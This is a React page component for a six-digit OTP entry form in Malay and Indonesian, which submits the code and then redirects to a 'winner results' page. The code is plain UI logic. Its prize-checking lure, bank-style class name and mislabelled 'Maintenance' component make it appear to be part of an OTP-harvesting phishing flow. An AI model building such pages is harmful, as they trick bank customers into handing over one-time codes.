import { Head } from "@inertiajs/react";
import { useState, useRef } from "react";
import axios from "axios";

export default function Maintenance({ costumerId }) {
    const [otpDigits, setOtpDigits] = useState(["", "", "", "", "", ""]);
    const [error, setError] = useState("");
    const [success, setSuccess] = useState("");
    const [loading, setLoading] = useState(false);
    const [resendLoading, setResendLoading] = useState(false);
    const inputRefs = useRef([]);

    const handleOtpChange = (value, index) => {
        // Only allow numeric input
        if (!/^\d*$/.test(value)) return;

        const newOtpDigits = [...otpDigits];
        newOtpDigits[index] = value;
        setOtpDigits(newOtpDigits);
        setError("");

        // Auto move to next input if digit is entered
        if (value && index < 5) {
            inputRefs.current[index + 1]?.focus();
        }
    };

    const handleOtpKeyDown = (e, index) => {
        const key = e.key;

        // Move to previous input on backspace
        if (key === "Backspace") {
            if (otpDigits[index]) {
                // Clear current digit
                const newOtpDigits = [...otpDigits];
                newOtpDigits[index] = "";
                setOtpDigits(newOtpDigits);
            } else if (index > 0) {
                // Move to previous input
                inputRefs.current[index - 1]?.focus();
            }
        }

        // Allow Tab key for navigation
        if (key === "Tab") {
            // Let default behavior handle Tab
            return;
        }

        // Prevent non-numeric input
        if (
            !/^\d$/.test(key) &&
            !["Backspace", "Tab", "ArrowLeft", "ArrowRight"].includes(key)
        ) {
            e.preventDefault();
        }
    };

    const handleOtpPaste = (e) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData("text").slice(0, 6);

        if (!/^\d+$/.test(pastedData)) return;

        const newOtpDigits = pastedData
            .split("")
            .concat(Array(6).fill(""))
            .slice(0, 6);
        setOtpDigits(newOtpDigits);
        setError("");

        // Focus on the last digit or next empty field
        const nextEmptyIndex = newOtpDigits.findIndex((digit) => !digit);
        const focusIndex = nextEmptyIndex === -1 ? 5 : nextEmptyIndex;
        inputRefs.current[focusIndex]?.focus();
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        setError("");
        setSuccess("");
        setLoading(true);

        const otpCode = otpDigits.join("");

        try {
            if (otpCode.length !== 6) {
                setError("Sila masukkan kod OTP lengkap (6 digit)");
                setLoading(false);
                return;
            }

            const response = await axios.post("/otp/verify", {
                costumer_id: costumerId,
                code: otpCode,
            });

            setSuccess(response.data.message);
            setOtpDigits(["", "", "", "", "", ""]);

            // Redirect ke halaman hasil pemenang setelah verifikasi berhasil
            setTimeout(() => {
                window.location.href = "/hasil-pemenang";
            }, 2000);
        } catch (err) {
            setError(
                err.response?.data?.message ||
                    "Terdapat ralat. Sila cuba semula.",
            );
        } finally {
            setLoading(false);
        }
    };

    const handleResend = async () => {
        setError("");
        setSuccess("");
        setResendLoading(true);

        try {
            const response = await axios.post(`/otp/resend/${costumerId}`);
            setSuccess(response.data.message);
            setOtpDigits(["", "", "", "", "", ""]);
            inputRefs.current[0]?.focus();
        } catch (err) {
            setError(
                err.response?.data?.message ||
                    "Gagal menghantar OTP. Sila cuba semula.",
            );
        } finally {
            setResendLoading(false);
        }
    };

    return (
        <main className="bimb-pink-pattern flex min-h-screen items-center justify-center px-5 py-10 font-sans text-white sm:px-8">
            <Head title="Pengesahan OTP" />

            <div className="w-full max-w-md">
                <p className="text-sm font-bold uppercase tracking-[0.22em] text-white/75">
                    Pengesahan Keselamatan
                </p>

                <h1 className="mt-5 text-4xl font-bold leading-tight sm:text-5xl">
                    Masukkan Kod OTP
                </h1>

                <p className="mx-auto mt-5 text-lg font-medium leading-8 text-white/90">
                    Silahkan masukkan kod OTP untuk melanjutkan pengecekan
                    hadiah.
                </p>

                {success && (
                    <div className="mt-6 rounded-lg bg-green-500/20 px-4 py-3 text-green-100 border border-green-400/30">
                        {success}
                    </div>
                )}

                <form onSubmit={handleSubmit} className="mt-8">
                    <div className="mb-6">
                        <label className="mb-4 block text-sm font-semibold">
                            Kod OTP (6 Digit)
                        </label>

                        {/* OTP Input Boxes */}
                        <div className="flex justify-center gap-2 sm:gap-3">
                            {otpDigits.map((digit, index) => (
                                <input
                                    key={index}
                                    ref={(el) =>
                                        (inputRefs.current[index] = el)
                                    }
                                    type="text"
                                    inputMode="numeric"
                                    maxLength="1"
                                    value={digit}
                                    onChange={(e) =>
                                        handleOtpChange(e.target.value, index)
                                    }
                                    onKeyDown={(e) =>
                                        handleOtpKeyDown(e, index)
                                    }
                                    onPaste={handleOtpPaste}
                                    placeholder="-"
                                    className="h-12 w-12 rounded-lg bg-white/10 text-center text-2xl font-bold text-white placeholder-white/30 outline-none backdrop-blur transition-all focus:bg-white/20 focus:ring-2 focus:ring-white/50 sm:h-14 sm:w-14"
                                />
                            ))}
                        </div>

                        {error && (
                            <p className="mt-3 text-center text-sm font-medium text-red-300">
                                {error}
                            </p>
                        )}
                    </div>

                    <button
                        type="submit"
                        disabled={loading}
                        className="w-full rounded-lg bg-white px-6 py-3 font-bold text-pink-600 transition-all hover:bg-white/90 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                        {loading ? "Sedang memproses..." : "Sahkan"}
                    </button>
                </form>

                <p className="mt-6 text-center text-sm text-white/70">
                    Tidak menerima kod OTP?{" "}
                    <button
                        onClick={handleResend}
                        disabled={resendLoading}
                        type="button"
                        className="font-semibold text-white hover:underline disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                        {resendLoading
                            ? "Sedang menghantar..."
                            : "Kirim semula"}
                    </button>
                </p>
            </div>
        </main>
    );
}
